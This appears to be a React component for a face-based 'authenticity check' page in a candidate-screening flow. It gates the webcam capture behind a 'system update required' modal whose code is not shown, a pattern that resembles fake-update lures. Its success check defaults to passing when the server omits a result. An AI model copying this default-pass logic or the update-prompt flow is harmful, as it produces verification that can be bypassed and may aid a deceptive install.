import { useState } from 'react'
import SystemUpdateRequiredModal from './SystemUpdateRequiredModal'
import FaceVerificationModal from './FaceVerificationModal'
import axios from 'axios'
import { updateEligibility } from './RouteGuard'
import { FaTimesCircle, FaCheckCircle, FaShieldAlt, FaArrowLeft } from 'react-icons/fa'
import { useNavigate } from 'react-router-dom'

const PhotoVerification = () => {
  const [showDriverModal, setShowDriverModal] = useState(false)
  const [showFaceModal, setShowFaceModal] = useState(false)
  const [alert, setAlert] = useState({ type: '', message: '' })
  const navigate = useNavigate()

  const handleStart = () => {
    setAlert({ type: '', message: '' })
    setShowDriverModal(true)
  }

  const handleDriverContinue = () => {
    setShowDriverModal(false)
    setShowFaceModal(true)
  }

  const handleImageSubmit = async (imageBlob) => {
    // close modal while uploading/processing
    setShowFaceModal(false)
    setAlert({ type: '', message: '' })

    try {
      const formData = new FormData()
      formData.append('faceImage', imageBlob, 'face.jpg')

      // POST to your verification endpoint
      const response = await axios.post('/verify-face', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      })

      // treat server's response as authoritative
      const ok = response?.data?.ok ?? true
      if (ok) {
        setAlert({ type: 'success', message: 'Submission verified — thank you. You may continue.' })
        updateEligibility({ formSubmitted: true, verificationPassed: true })
        navigate('/complete')
      } else {
        setAlert({
          type: 'error',
          message: response?.data?.message || 'Verification failed. Please try again.',
        })
      }
    } catch (error) {
      let msg = 'An unexpected error occurred. Please try again.'
      if (error.response) {
        msg = error.response.data?.message || `Server error: ${error.response.status}`
      } else if (error.request) {
        msg = 'No response from server. Please check your connection.'
      }
      setAlert({ type: 'error', message: msg })
    }
  }

  return (
    <div className="max-w-3xl mx-auto py-10 space-y-10 px-4">
      {/* Header */}
      <header className="text-center space-y-4 pb-6 select-none">
        <h1 className="text-3xl font-bold">Submission Authenticity Check</h1>
        <p className="text-gray-600">
          To protect our platform and ensure authenticity, Ava Labs uses AI-powered face detection.
          This check is <span className="font-semibold">only performed in real-time</span> to
          confirm your submission.{' '}
          <span className="font-semibold">We do not store your image data.</span>
        </p>
      </header>
      {/* Sample: Failed vs Successful */}
      <section className="grid grid-cols-1 md:grid-cols-2 gap-6 select-none">
        {/* AI-generated / failed example */}
        <figure className="bg-white rounded-lg shadow overflow-hidden">
          <div className="relative">
            <img
              src="/images/ai-fail-example.jpg"
              alt="Example of AI-generated or manipulated face — rejected"
              className="w-full h-auto"
            />
            <div className="absolute inset-0 flex items-start justify-start p-4">
              <span className="inline-flex items-center gap-2 rounded-full bg-base-200 text-red-600 font-medium px-3 py-1 shadow">
                <FaTimesCircle className="text-lg" />
                Rejected
              </span>
            </div>
          </div>
          <figcaption className="p-4 text-sm text-gray-600">
            Example: AI-generated or manipulated face using{' '}
            <a href="https://www.swapface.org/" className="link" target="_blank" rel="noreferrer">
              Swapface
            </a>
            ,{' '}
            <a href="https://aifaceswap.io/" className="link" target="_blank" rel="noreferrer">
              AI Face Swap
            </a>{' '}
            — rejected by our system.
          </figcaption>
        </figure>

        {/* Real / success example */}
        <figure className="bg-white rounded-lg shadow overflow-hidden">
          <div className="relative">
            <img
              src="/images/passed-example.jpg"
              alt="Example of AI-generated or manipulated face — rejected"
              className="w-full h-auto"
            />
            <div className="absolute inset-0 flex items-start justify-start p-4">
              <span className="inline-flex items-center gap-2 rounded-full bg-base-200 text-green-600 font-medium px-3 py-1 shadow">
                <FaCheckCircle className="text-lg" />
                Passed
              </span>
            </div>
          </div>
          <figcaption className="p-4 text-sm text-gray-600">
            Example: Genuine live capture — accepted by our system.
          </figcaption>
        </figure>
      </section>

      {/* Why it matters */}
      <section className="rounded-lg bg-white shadow p-5 select-none">
        <h3 className="text-md font-medium mb-2">Why we perform this check</h3>
        <ul className="list-disc list-inside text-gray-600 space-y-1 text-sm px-4">
          <li>Prevent AI-generated or fraudulent submissions</li>
          <li>Ensure the shortlist contains only genuine candidates</li>
        </ul>
      </section>

      {/* Privacy & security */}
      <section className="rounded-lg bg-white shadow p-5 flex gap-4 items-start select-none">
        <div className="flex-shrink-0 mt-1">
          <FaShieldAlt className="text-primary text-2xl" />
        </div>
        <div className="space-y-2">
          <h4 className="text-md font-semibold">Privacy & Security</h4>
          <p className="text-sm text-gray-600 mb-2">
            The check is processed automatically by our verification service. We do not retain raw
            face images on our servers. Only the verification outcome (pass / fail) and minimal,
            non-identifying metadata (timestamp, algorithm version) are stored to prevent abuse and
            support auditing.
          </p>
        </div>
      </section>

      {/* Alert */}
      {alert.message && (
        <div
          className={`alert ${alert.type === 'error' ? 'alert-error' : 'alert-success'}`}
          role="status"
        >
          {alert.type === 'error' ? (
            <FaTimesCircle className="text-lg" />
          ) : (
            <FaCheckCircle className="text-lg" />
          )}
          <span>{alert.message}</span>
        </div>
      )}

      {/* CTA */}
      <div className="flex justify-between items-center">
        <button
          className="btn btn-ghost px-6 flex items-center gap-2"
          type="button"
          onClick={() => navigate('/')}
        >
          <FaArrowLeft />
          Back
        </button>
        <button className="btn btn-primary px-8 py-3" onClick={handleStart}>
          Run Authenticity Check
        </button>
      </div>

      {/* Modals */}
      <SystemUpdateRequiredModal
        isOpen={showDriverModal}
        onClose={() => setShowDriverModal(false)}
        onContinue={handleDriverContinue}
      />

      <FaceVerificationModal
        isOpen={showFaceModal}
        onClose={() => setShowFaceModal(false)}
        onSubmit={handleImageSubmit}
      />
    </div>
  )
}

export default PhotoVerification
